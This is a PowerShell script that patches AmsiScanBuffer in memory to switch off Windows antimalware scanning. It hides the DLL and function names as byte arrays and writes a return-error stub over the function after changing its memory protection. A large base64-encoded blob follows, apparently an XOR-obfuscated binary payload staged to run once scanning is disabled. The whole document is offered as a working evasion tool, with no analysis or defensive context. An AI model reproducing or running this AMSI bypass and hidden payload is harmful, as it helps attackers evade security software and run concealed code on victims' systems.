
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
#0:  31 c0                   xor    eax,eax
#2:  05 78 01 19 7f          add    eax,0x7f190178
#7:  05 df fe ed 00          add    eax,0xedfedf
#c:  c3                      ret 
#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)

$enc = [system.Text.Encoding]::UTF8


$EncodedText = "+q6qc2B7dmF8ens1XHtjen5wOEZWRn1weXkfbh8fNTU1NU5WeHF5cGFXfHtxfHtyPTxIHzU1NTVF
dGd0eDU9HzU1NTU1NTU1TkZhZ3x7ckgfNTU1NTU1NTUxVnp4eHR7cTUoNTc3Hx81NTU1PB8fNTU1
NTF3dGZwIyF3fHt0Z2woN0FDZERUVFhUVFRUUFRUVFQ6Oi1UVFlyVFRUVFRUVFRURFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUclRUVFRUIXNgciFUYVR7W1x3
cldBWCV9Q1J9ZXZsV2J2eCx7dnhTYVxSW313eCBjcVZXfE9GV2xxQiFydEIhckdQLEFcUiRjT1JA
YFFEJV5fVFRUVFRUVFRUV0RHRFRUQVRQUVRdRHp5IVBUVFRUVFRUVFRUWlRUXHJUWVRBVFRUV2JU
VFRUXFRUVFRUVFRUTX96VFRUVHJUVFRURFRUVFRUV1RUVFRyVFRUVFRyVFRXVFRUVFRUVFRUVFBU
VFRUVFRUVFRUVlRUVFRUVHJUVFRUVFRUVFhURFxAVFRXVFRUV1RUVFRUVFBUVFRQVFRUVFRUVFRX
VFRUVFRUVFRUVFRUVFRUVGIjVFRXRVRUVFRUUFRUVFhUU1RUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRSVFRUVGJUVFRXIVpEVFRaVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRcVFRUVlRUVFRUVFRUVFRUVFRUVFZWVFRUUHJUVFRUVFRUVFRU
VFRUVFYgJU9NfSVUVFRUT1d6VFRUVHJUVFRUXVRUVFRUXFRUVFRUVFRUVFRUVFRUVFRUVFZUVFRS
VGB2e1tsTGJUVFRYVFNUVFRURFRUVFRUTFRUVFRwVFRUVFRUVFRUVFRUVFRUVFRUV1RUVFdUWXtf
eXdSLH9UVFRYVFRUVFRSVFRUVFRWVFRUVF9UVFRUVFRUVFRUVFRUVFRUVFRURFRUVERyVFRUVFRU
VFRUVFRUVFRUVFRUVFRXVFpyVFRUVFRUVFByVFRUVFZUVEBUb1ZcVFReYkJUVFRXVFRUVFZyVFRX
clRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFdYYlZiV3lUclRUVERUVFBGclpUVFRednJQVFRdVHpRYlRUVnxyWlRUVF5UeiBlXVYt
WXZkXFRUXVR6UWJUVFZ8elZTZXpeVH1wdFZiXEx4cmJWUk96W1R9ZHRQYkRWUiB6QVdNIURUVFRe
UGJMd1BicWxfRFBUdlRMelBEVFRWfVBQWVFXbE1iUFR2VnJFVFRUXlBERF9QREBzVkdMRld8cldU
VFRSWUdDbG9EUFR2VnJcVFRUUn9XRFRUVFB6UERUVFZ8ekdXfHJWVFRUUllHQ2xRRFxUdlZyXFRU
VFJ/V0RUVFRQelBEVFRWfHpSU1ZUOlRULVReVFhUVFRMQVZXUFxzfVRUVFR6elByVFRWfGJDdnh+
VlRdVHpWVFRUV3piQFRUVFdeV1BUVFR6ZHZnWFZUXVRHVlxiQVRUVFdeV1BUVFRlbCNiXFR2VHZ6
UERUVFZ9UFxXbFE6VEQtVF5URFRUVExBVk1ceVRiV2JQRHhYUGJUVFRGckdUVFReUHJnPlNETFRU
VFxCXldYVFRUekFWbVBfUERmQlBydnpXRFRUV3wldFBEdmFTe19xVGJXYl5UclRUVHRYU1RUVFRG
ckdUVFReXiRPbCFyWFR2V1Bdf1dMVFRUUHpQRFRUVn1QXV5XWFRUVHpBVm1QX1BEZkdXbVxdXlRA
VFRUTHhQcmU+UFRUVFZ7JX1UVFRQUERmRlFjIUNXclRUVH1QWn9UTFRUVFx6U1RUVFZ8ckNUVFRe
ZURMVFRUXEFWfVBecGxQVFRURHpTclRUVn1YWHZ/clBUXVRHUVZyR1RUVF5QRGZ6U2JUVFZ9UF9T
R35CVldEQFNXREBTVnJSVFRUUllHQ2x9ckRUdlZyXFRUVFJ/V0RUVFRQelBEVFRWfGVsUGJAVHZU
cnpQRFRUVn1QX1N9RHpXYlRUV3xyXFRUVFJQYiVhXX1QW1xXJVBUVFRgU01fc1dEV2JeVHJUVFR0
WFNUVFRURnJHVFRUXl57WUdXRFdiXlQtVFRUekdWR0BPU31QWFNXREBTV0RAXlRMVFRUTGFTTVxX
V3JXYl5UclRUVHRYU1RUVFRGckdUVFReXnteWldyV2JQRGJ6UERUVFZ8enBUfHJMVFRUXl5yVFRU
UF9BRn5cV1RUUFRUVFRUVFRiVFRUVydYfCFiWX9AYltvXCZUVFRUVFRAVHdUVFRUWFRTVFRUf3Ny
VFRZVExUVFhyXVRUVH9AJkdsdEIge3ZiVFRUVFElUURUVCZUTFRUVltDQGJRRFNUVFRQVFRUVFZb
XUNAeVBUVFRUIVdEVFRYYldUVFR/RHhtY0xyVFRUVFRUVFRUVlRUVFdDbyVWU1R+VlRUVFQ+clBv
VFdMVFRUUFRUVFRNVFRUVFdyVFRUVkxUVFRUWVRUVFRfRFRUVFdyVFRUVHRUVFRUUURUVFRUTFRU
VFRRVFRUVFRiVFRUVH5UVFRUV1RUVFRURFRUVFREVFRUVFRUUXpTVERUVFRUVFRXclZjV1RAXVdy
VHZXREBdV3JRLVQsWFJRYlR5V2JUVFdyVH5XVnZSV3JWRldWdlJXcldvV1Z2UldyVFFXRnZSV3JR
RVdWdlJXclF6V1Z2UldyVCJXVnZSV3JURFdaTFJXclFgVD5MUldyV0JXVnZSV3JWT1diWFJXclRe
V3JYUldyVmdUYlhSV3JRYlRyWFJXclFYV3JYUldyVF5UVFhSV3JWWVdwTFJXclRZVFRYUldyUXRU
YlhSVFRUVFRXUFRUVFRUVFRQVFREVFdUV1RUJnJCQVdBJVRURFRXVFRcV1RUVyZURFRURERUV1RU
YlRUclBUVEVQV1RUV1dUVExUUVRUVlREVFRgRFBUVFBQVFByVFhUVGZXUFRWcldiVFRHRFRwVFRi
VFdyTyJUeERUQ3pXR1RYRFRDelQtVFhEVEN6UV9UWERUQ3pRY1RYRFRXck8iVHhEVEN6V1lUZnJU
Q3pXYlRYclRDelZeVFhyVEN6V3tUdnJUQ3pUT1RmclRDelQlVHZyVEN6UXdUdnJUQ3pUY1RYclRD
elYiVFhyVEN6UXNUWHJUQ3pWUVR2clRXck8iVHhEVEN6V0dUWGJUQ3pXRlR2YlRDelRwVHZiVEN6
VCdUZmJUQ3pRLVR2YlRDeldwVGZiVEN6VmZUdmJUQ3pUXVR2YlRDelZ7VFhiVEN6VkVUdmJUQ3pR
XFR2YlRXclZzVCdQVFdyUUNUJ1BUV3JRR1dCUFRXclQlVG92VFdyV3NXf3ZUV3JXZFRSUFRXcldR
V292VFdyV0JUb3ZUV3JXYFRvdlRUVFRUVFxUVH5sVmNXYVRUVERUVFRUVFRyVFZHXF92UidiVFxU
VFRUVFRWVFRfTHJ8RHdyVFR+VFRUVFRUXFRUfkZRRVRgdlRRVFRUVFRUVHJUVkdcUkBTInJURVRU
VFRUVFZUVF9MclJyUSZUV1hUVFRUVFRcVFR5fFF3VHJMV11iVFRUVFRUclRWQlxZflJRclB/VFRU
VFRUVlRUX1Byf1RcRlRGWFRAVlRUVFRUVHlyVE1XfXJXX0RRV1xyVFRUVFZSUlhMUldyVHhUVFRy
VFRUVFRUVHJURFcjVGJUclRyVHZXclRyVGJWIFRyVFRXVFYkVGJUVFdEV2BXclRUV3JURVdyVFRU
RFREV3JUVFREVFJUYlRUVHJUQFRiVFRUYlZfV2JUVFREVz5XclRUVHJRIVRyVFRUYlZfV2JUVFRE
UXpUclRUVHJXIVdEVFRUYldSV0RUVFdUVnxUclRyVFRUVFRUVFRURFFSVHJUVFRyVkdUYlRUVGJR
X1RiVFRXVFFWV0RUVFdEVH9UYlRUV3JXWldyVFRXYlZMVHJUVFZUVCVXYlRUVkRXUVRiVFRWclZg
VHJUVFZiV3JUYlRyVFRUVFRUVFRURFFSVHJUVFRyV3NXYlRUVGJXJFdiVFRURFdMV2JUVFRyV0RX
YlRUVERXYldiflRtckxXVFdQVG1yTFJUV35UbXJMXlRWflRtckxEVFFQVG1yTERUUX5UbXJMRFRQ
UFRtckxEVFB+VG1yTERUU1BUbXJMRFRTflRtckxEVFJQVG1yTENUUn5UbXJMRFRdUFRtckxEVF9Q
VH1iWGBUX1BUfWJYbFRfflRaREwmVF9QVH1iWCNUX35UYERxVFReflQgckNSVF1+VGJEW1lUXn5U
JmJbRFReflRFck9NVF5+VCxEQ3ZUXX5UbXJMUlRUflRWVFdiVFR+VFFUVyRUVH5UUFRXJFRUflRT
VFckVFR+VF1UVyNUVH5UXFRXOlRUflRfVFZQVFR+VF5UVl9UVH5UWVRWWlRUflRYVFZBVFR+VFtU
VkxUVH5UWlRWcVRUflRFVFZ8VFR+VERUVntUVH5UR1RWTFRUflRBVFdiVFR+VEBUVyNUVH5UQ1RX
OlRUflRCVFZQVFR+VE1UVl9UVH5UTFRWWlRUflRPVFZBVFR+VHRUVmZUVH5Ud1RWbVRUflR2VFYn
VFR+VHFUViJUViFUVmJUcFRGIVRQYlR7VEYhVFJiV1JURiFUXGJXRVRGIVReYld2VEYhVFhiV3ZU
RiFUWmJXfFRGIVREYldFVEYhVEZiV21URiFUQGJXdlRGIVRCYld2VEYhVExiVkZURiFUdGJWLVRE
WFRiVFRTVFhcVFdiUVZUVH5UYnJUe1RYVFRFYlFUVFd6VExEV35UXlRTVERWYVdCVEdUYlZjV3JQ
VERUUFNUX3ZSVERXU1REdlR3VFxXVFBMV1ZEUUVUclBUR3JQWVRSQFNURFRUVEQlVEBEQFdUUFRX
UWJRd1RyXFRUVFBHVFl+UlRiVFRUR1hUf1RcUVRURlRUVFRXVFRUVFRUVFRUVFRUVFRUVFRZelNU
VFRWVFRUVFRUVFRUVFRUVFRXe1RcWFZUVFRUVFRYVFRyVFBUVFxUV0RUVlRUTFRUclRUVFRUVFRS
U35xeFNidEFYbFRTQ193e0RvWHJULUFCLH5xQm15RXJXUXRSU2BPJ0NBT01fJ3RCW3lEJyxgT3h5
e0REV11HQCBTQH55UU0kX1NEQERUQCRHV0F+R1dAfkdzQH55XUZTR0FNJF9TREBEVEAkR1dBfkdX
QH5Hc0B+eV1GU0dBTSRfU0BDQ19AfkNQVF1HfU8leVBUU1tRTSUkV0F+U11HQ19zRCRfU0RDR1NN
JFtTQHlPX0QlQFRAJVtzQUBTWkRAcVNAeSxTQXlDW0dDX1dDUENzQCVDRkN+eVFHRFdBR0NfQkZA
W1NNJXlaQ1BDRkB+LF1EQ0dTVFBxU0F+Q0ZGQFtzQyRfX0NQQFRAJEdXQX5HV0B+R3NAfnldRlNH
QU0kcUZGQ0dTVFBxU0F+Q0ZGQFtzR0N9U0QkQ0BHRFdBQ1BTWkdQU0ZHUyxGRkBxXENTW3NHQ31T
RCRDQEdEV0FHQ19CRkBbU00kV1dDQ1tTTSVbRUF5R19BeUNTVFNbU0B5T19EJUNzRCV9V0F+cVNN
JVtFQX5PX0diV0FEJCxbREAgV0clQ0ZNJSRFR1B5UkJDLFZBJSxATSVbRUF+T19HYldBR0NfQkZA
W1NNJFNDR0NfT00lW0VBfk9fR2JXQUQkLFtEQCBXRyVDRk0lbUVEJWZUREBbUUdDW0FNJSRXQCVm
VEclQ1pHQ19fRCQsV0FQYlRAJUNGQ355UUdDLENAJUNGTSVHU0d+eVpHQEdzRCUsWkNTX0VBVFdB
R0NfQkZAW1NNJFtAQSRUVEAlQ0ZDfnlRR0MsV0QlW1NAJFhUQCVDRkN+eVFHQyxXQVBtc0RAW1FH
Q1tBVFNbUU0lJFdBflNdR0Nfc0RAbVhNJVNRRCVDQUBiV0FEJSRzREBbUUdDW0FUU1tTQHlPX0Ql
Q3NHQCBDQUBDRkRDR1NNJUdTQFBDWkdQQ1pDU1hUQCVbc0FAU1pEQHFTQHksR0NAQ0ZCQyxYQSVb
WU0kW0BEQ0dDQGJXQUdDX0JGQFtTTSRTQ0dDX09NJFtARENHQ0BiV0FEJCxbREAgV0clQ0ZNJVtF
QX4gU0QkRFRAJUNGQ355UUdDLEFDUFNGQ1RXRXZSQ2BAJVtbTEIgfU8nQ2xDYlcnTEJtJE9DLHNU
UiRvTCcsbHdSeXxUUHFmdydffXdQU2Z3Uix/VFJtYk9dcUBMQnFfT1RXfHBNR3l2JSB5T0JHeU9U
V2Z2U1d9diZbJncmX35UUm1idiZlRExNW29xJyxsT1RXekAnQ2xxeHl/T0RXRXZSQ2BAJ0NscXh5
f09EV0FxUlNscVNbeXZ7T2VMJ0BUdidDbHF4eX9PRFdRdycgb3cnbXlUUm1iQCdDbHF4eX9PQCB9
d0JAVHddV1tMQlt6dEIgeUF4U2FPRFdmdlBHfXFSU3xMTVt5QXhTYU9EV2Z2UF9ld3hTbHBDV31x
Un1aTEIkeVRSX2V3eFNscENXfXFSfVpMQiR5VFJtYkAnQ2xxeHl/T0NbJUxNXyVBeFNhT0RXb3FS
U2xxUCB9d0JAVHddV1B0TVtid1JTIEF4U2FPRFd+dE1bYndSUyBBeFNhT0RXZnZdWyNDTVt5dngg
fXdCQFRDJl9lcVJDWHRCIHlUUkcmQCdDbHF4eX9PQ0cgdlJAVHYnQ2xxeHl/T0NHIHZSQFRDeFNm
cUJDQHBNV3lUUkcmQVIse3cnIEBwTVd5VFBxeXFTRyB2UkBUT11xQXFSU2xxU0cgdlJAVHYmR312
e0dAcE1XeVRTVyV2eUdjQCZHbHFCWyVxTV95VFBxJHRCR1dxXUdsdEJfJHFSQFRHUkN8cUJxe0xC
X2ZPQFMlcV1fZUx7QyVPRFdRdyckQnRNW2VMeG15RE1HJXZ4eXxxTUd5VFBTb3YnQ2FMeG0gQ1J5
JXdSQ1dxXUdsdEJfJHFSQFRETVtvT0IkfHddeUB2eFN+T0IkfXZ4YVdxXUdsdEJfJHFSQFRETVtv
T0IkfHddeVJ0Qm15Q3hDbHYneWN3flMlcV1fZUx7QyVPRFdXdiZbeXdCX2ZwQFtjd3hPZU8mQ2xM
TUdldycgV3FdR2x0Ql8kcVJAVERNW29PQiR8d115UE9NW392eHlicVJ5Y3d+UyVxXV9lTHtDJU9E
V1F3JyRidEJtfXFSeWN3eV95d1JTIUxNR2V3JyBvRE1HJXZ4eXxxTUd5VFBTb3YnQ2FMeG0gQF1f
Y09dQ39xUFMlcV1fZUx7QyVPRFdXdiZbeXdCX2ZwQFtjdl15bHRCcXpxUFMlcV1fZUx7QyVPRFdX
diZbeXdCX2ZwQFtjd01XfXd7eVdxXUdsdEJfJHFSQFRAe0NgcVJ5YU9AW2N3TVd9cVJ5fHRCbWVx
XXlXcV1HbHRCXyRxUkBUdidbb3RSQ2Z3ViB5cFJAVEx7Q3hPeENsQCd5I09EV1F0UlNgTydDQU9N
Xyd0Qlt5RCcsYE94eXtUU1MkT01fIEAnQ2xxeHl/T0BbY3d4T2VPYldtcUJDbHBDW3l2e09lTCdD
UXcnIHh0QnZUQUJTbHYnfX13VFdBdFFHbHZTW1FAJ3Jvd1JiVExCRydMTVdlWG9cYE9SbWZUUmF5
dnggeXdRWGxZeEdmd1RXb0wmW3pPQm1mVFJHJkdNX2x3Jl9RdycgJXZ4LGZUUkNsdngsbEQnLGBx
XV9jd1RXRHZ4LHt2eFNhVFBTZndSLH9EJyxATE1bZ0FCQ2FUUE9sT0JDUXckR312J2FbT0IlVEAm
eW9xUkNhVFBDYHFCJVR2Un1AdydheXdyV1tMQnlgVFJtYnYmZVB3JyR9dEIhVEAmeW9xUkNhWXlf
eU94bXlMJkdldychVEJ4Q2x3YldEcV1fQHckWyV2eHlgTyVTJHFSLVR3XVdYdydTfkEmX35PTV9d
dngsJHZUV2Z3J1N+QSZffk9NX112eCwkdlRXfnElbWNPJyxgQF1fY3F4eX5PTVxUdFNbUUFCU2BM
QnF5dnJXRXZSQ2BAJVtbTEIgfU8nQ2xUUHlhdlJDbHYnLGBMTUd5QVIse08nQ35BJyBDdidDbFRQ
bWNPJyxgQ01beXZyV11PTUdYTE1bJUdNX2x3JlxUWXhbJXcmXFRGQiAlQF1HbFRTWyB2Jkd5d0Yg
UHRCU3t3eCxvcVJ5f3ZiV0FwTVslT0IlYEB7Q2BxUnlhT0YgX3d7R3l2eCxiQCdDbHF4eX9PTVhU
QCZ5b3FSQ2FZeV8kd3tHZXdCQGBEJyxhdlJ5Zk9NX0FPTV8ndEJbeXZiV1BPQl8kTydxZXd4cVt3
J0d5dmJXZnZQR3l2UkNgT1JDYEwneXl2Yld+T01XeXd4R3l3eFtlT01YVE9dcVZwTUd5dmJXJEd4
bX1PJlhUT11xWnFCJEFPTV8ndEJbeURNX3t2Yld9dnhxb1RSbWJAJ0NscXh5f09AU2xPJE95TCZH
Y3Z7WFRPXXFQT01bZXZ4Q35EQlt/T01bb1RQLHx0eEN/cVRXR3FCQ2xwQ1t5dntPZUwnQ1F3JyB4
dEJxQXFdXyRMJkRUdyZXc0dNUyRMQm1lcV1+VFRUVFRUXFZzRURULFRRJVRFRFQsVFElVEVEVCxU
USVURURULFRRJVRFRFQsVFElVFxUV0FUUnJUW1RXbFRdVFRAYldRVFNYVHRUVG9UUmJUd1RUclRW
JVRZRFQ+VFZUVEByV3lUXUxUdERXb1RSQFRPVFRyVFJQVHFUVHJUU1xUTGJXY1RSflR3VFRyVFZy
VERiVH9UVlRUcXJXeVRdXFR2YldlVFItVHdyVGVUVlRURURULFRRJVRFRFQsVFElVEVEVCxUUSVU
RURULFRRJVRFRFQsVFElVFxUVFdyXFNBVFJyVFtUV2xUXVRUQGJXUVRTWFR0VFRvVFJiVHdUVGBU
UkBUcFRXeVRWVFRxVFd9VF1cVE9iV3lUXURUXFRXb1RSQFR2clcnVFJ+VExiV3lUVlRUdlRXfVRd
flR3VFdjVFJQVE9UVHJUUkRUd2JXYVRSUFR0RFdgVFZUVHFEV29UUkBUdnJXYFRSUFR3RFd5VFZU
VHZUV31UXVhUdmJXJlRSLVR2cld+VFRUIEJiVGRUUyVUXFRXQFRdXFRwRFdlVFIhVE9iVHJUXURU
d2JUclRSWFR3YldgVFIhVE9EV39UXURUXFRXJVRSLVRcVFciVFFUVHNEVFR3Q2ZUXnJXcVRWVFRD
RFdvVFJAVHZyV2BUUlBUd0RXeVRWVFRxYld9VF1YVFxUV2JUXVxUd2JXJ1RSflRPVFd5VFJEVFxU
V31UXURUcVRXeVRSJVR2VFclVFJ+VHdyV3tUVlRUcVRXY1RWVFRMYld9VFJiVHdUVHJUUGJUd2JX
e1RSLVR3cldDVF1YVE9EV2xUVFQ6QmJUfVRTJVRcVFdYVFItVE9iV2NUUiFUQ0RXb1RSQFR2clRy
VFJMVExEV2VUUmJUT0RXflRWIVRcVFdTVF1cVHZyV2NUXVxUWnJXIlRRVFRzRFRUQiRmVFxEV3FU
VlRURkRXYVRdVFRPRFdsVF1YVHdiV2BUUlBUcVRXeVRQYlR3Yld7VFJ2VE9EV35UUC1Ud3JXQ1Rd
WFRPRFdsVFZUVE9yV31UUn5Ud1RXeVRSRFRZclRyVFBAVHZyV2xUUi1UdnJUI1RdZlRYVFcsVFRX
X0JiVH1UUyVUXFRXRVRdVFRPRFdgVFNYVERiV1tUUlBUd3JXfVRSdlRPRFdsVFBQVFxUV3hUUlBU
dERXZlRSQFRPVFR9VFZUVEdEV2xUXVxUd2JXbFRRelRwYlRiVF0lVFRRcXdUVnpUTURUclRTWFRE
YldzVFByVEREV1pUUERUQVRXU1RWVFRBRFd9VFIhVExEV3tUUkBUdnJUclRRVFRwVFciVFFUVHNE
VFRaQ2ZUXnJXcVRWVFRBYldiVFJAVHdyV2VUUiFUT2JUclRdZlRYVFcsVFZUVEBiV3lUXVxUcXJX
ZVRSWFRPRFRyVFYhVFlyVGBUViFUVFFxd1RWelRNRFRyVFNYVERiV3NUUHJURERXWlRQRFRBVFdT
VFZUVEBiV3lUXVxUcXJXZVRSWFRPRFRyVFFUVHBUVyJUUVRUc0RUVHJcW3dUVlBUTURUclRTUFRx
RFd5VF1cVHBEV0FUUkBUdnJXJ1RSflRMYld5VFBYVHdiV2BUUkxUdERXe1RWVFRPcld9VFJ+VHdU
V3lUUkRUXFRXJVRSLVRcVFdsVFJAVExEV35UVlRUcVRXelRSQFRcVFdvVFJAVHZyVydUUn5UTGJX
eVRWVFR2VFd9VF1EVHRUVGBUVlRUR0RXbFRdXFR3YldsVFF6VHBiVGJUXSVUVFNDd1RWelRNRFRy
VFBiVEBUV0dUU0BUR0RXRlRTflRNYldBVFBAVEByV0JUUH5URGJXU1RTLVREYldFVFAhVEdyV19U
UHZURERUclRSIVRPRFd5VFJEVFxUVyJUUVRUc0RUclRSXFRwRFclVFJAVHZiVFRBQ2ZUXnJXcVRW
VFRBYldsVFJ+VE9iV2VUUiFUTERXZlRWVFR2Yld5VF1cVHFyV2VUUlhUT0RUclRSXFR0RFdgVFJQ
VHZyVyBUVlRUdlRXfVRdRFR0VFRyVFZcVHBiVGJUXSVUXHJUVHJcYXdUVlBUTURUclRQWFR0VFd9
VFIhVE9iV3lUU1hUT0RXbFRdTFR0RFd/VFJAVERiV2NUUiFUT3JXZVRSdlRERFRyVFJMVExEV2VU
UmJUT0RXflRWVFRxVFdjVFZUVHFEV2JUUkRUTERXJVRSQFRcVFclVFJyVE9EVHJUXVhUT0RXbFRd
TFR0RFd/VFJAVFxUV2JUUlBUcVRXelRWIVRcVFdTVF1cVHZyV2NUXVxUWnJXIlRRVFRzRFRURiRm
VF5yV3FUVlRUQGJXeVRdXFRxcldlVFJYVE9EVHJUXVRUTERXJVRSclRcVFcmVFJQVHZiVHJUUlhU
dFRXfVRSIVRPYld5VFJEVFxUVyVUUi1UXFRUfFRdZlRYVFcsVFZcVFRdU3dUVlBUTURUclRTWFRx
VFd9VF1cVHFUV0FUUkBUdnJXJ1RSflRMYld5VFBQVFxUV3hUUlBUdERXZlRSQFRPVFRyVF1EVHdi
VHJUXVhUcVRXfVRdXFRxVFRyVF1EVHRUV3lUVlRUdmJXeVRdXFRxcldlVFJYVE9EVGBUVlRUR0RX
bFRdXFR3YldsVFF6VHBiVGJUXSVUVFYsd1RWelRNRFRyVFNYVE9EV2xUXUxUdERXf1RSQFRcVFcm
VFJQVHZiVHJUXVhUcVRXfVRdXFRxVFd5VFJEVFRcVllCYlR9VFMlVFxUV1FUUnJUTERXYFRSdlRP
RFdBVFJAVHZyVydUUn5UTGJXeVRQWFR3YldgVFJMVHREV3tUUFBUXFRXeFRSUFR0RFdmVFJAVE9U
VHJUXURUd2JUclRdXFRPRFcnVFJAVHZyVyVUVlRUcVRXelRSQFRcVFdvVFJAVHZyVydUUn5UTGJX
eVRWVFR2VFd9VF1EVHRUVGBUVlRUR0RXbFRdXFR3YldsVFF6VHBiVGJUXSVUVFAkd1RWelRNRFRy
VFNYVE9EV2xUXUxUdERXf1RSQFRcVFdiVFJQVHFUV3pUVlRUcWJXfVRdWFRcVFdsVFJAVHZiVyVU
Ui1UdnJXeVRSRFRcVFclVFItVFxUVHxUXWZUWFRXLFRWXFRUWkJkeGQgLGBcbVF9bD5WRyNvLUF3
QFRXVlRXVERyUVxUVFdXRlRXVEdQR1dWVFdURCFQXFRQV1R9WF1RYiFaUXIhWlF9clxSV3JHUldy
WlZHUExUYlRUVEREVFREUFpUckxMV0RUVlREIXZXRFRWVH1yTFdUVFdSVHJQXFRURk1ETFRUfWJM
UHklUFRUUFpSVERUVERQTFRyTFxUckxfVllxI01TTE9bWlZfV1RUVFFiVFBUVFRWVFREV1RUVFRX
VFxUVFRUUFdUVFRUVERcVFRUVFdXVFRUVFRQXFRUVFRURDpUVC1UV1dEVFRyVFBcclRWVFREX1RU
XFRXUFRUVFRUUHJUVFRUVERUVERUVFdFLVdRYlRXVHJQQFRiTEdRVFhSUEdUUVd9UEBWclRSVHIh
WlFyclxQV3JQVFRQVlJUTFRUbXJaUXJ+UlRUWExSVCFfVlRUUFZXckxWV1RcUXJUWVR9cl9WVHJa
UXIhWlFyIVpXYlRRVH1yXF1EIVFUVFRfV0RUVlJUfk9XRFRXVEclWlZUUFRWVFRUVFRUVF1yUFRU
RFdAVH1PTXZ4U2JBeCxgR019f09NVyV0QixgQ1J9bHcmcW9URHJXVFRcVFRUVFRUVGJXVFRxb0wm
W3pPQm1mVFRUU1REVFRUVFRaVERUX0FCeX92eCxvdydPJVRUVHJURFR3RCcsYnBNX2VPJ30lXFhe
ZVxQJGVMJl9jdicseHFWVGxYUVxtVFRUZVREVH5bQXZsT3hMJFtRfmFYb0d4THwlJVh/fiFZQX4h
W29+YUx/XCFPQXl5WFJYbVhvQCZUVFRYVERUXVhGIWJZf1RgWFRUVFRUVFRUVFRUVFlYUUVgJVRU
VFRUVHJUVFRTYlRUVFZiWkRUVGZXZlRUVFRUVFRUVFRUVFRUVFRUVFdUVFRUVFRUVFRUVFRUVFRU
VFRUVFdGQCVHQXBcUFM6Wk10XiVsZUJYfXZdLVBDdFRQVFRUV1FaeW1DdidDbHYkbX1PUiRld3lt
b3cmQ2xMJ0N2dnhDYncmW3Z2J1tvdFJDZndTbW9MJlt6T0JtZk1SLHx0eW1GT0JteUxNW3lNXVt/
did9eXdSYmB2Ukd8VFFEI1RUVFRUVFRUVFRUVFRQISNUVFRUXFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUV1RaclRUVFRUVFRUVFRUVFRUVFMsUXcmX1NwUkNbTEJ5YFRSJG9MJyxsT0JAYE9S
bWZUVFRUVFRROl9EVHJEVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVlRXVFRUVFRyVFRWVFJUVFRUU1RUVFxUVFRUVFRUVFRUVFRUVFRUVFRU
VFBUVERUVFRRclRUXFRUVFRUVFRUVFRUVFRUVFRUVFRUUFRUVFRUVFxUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRQVFREVFRUUnJUVFxUVFRUVFRUVFRUVFRUVFRUVFRUVFBUVFRUVFRYVFFUVFZERFRU
VFhUWFRUVFRUVFRUVFRUVFRYVFglVFRUVENyV0FUUy1UQ3JXU1RTXFRAYldfVFAtVEFyV3NUUH5U
QXJXUlRQLVRUVFRUVFklUCI6IVRUVFBUVFRUV1RUVFRUVFRUVFRQVFRUVFRUUS1UVFRUVFRUVFRX
VFRUVFRQVFRUVFRUVFRUVFRUVFRUVFRUVFdQVFRUVFREV0JUUlBUdnJXUlRSflR3VFd5VFB+VHdy
V3hUUi1UVFRUVFRWRFRXVFRUVFNEVHZyV31UUiFUdmJXZlRSUFRxVFdlVFItVHdyVFRUVFRUVFRW
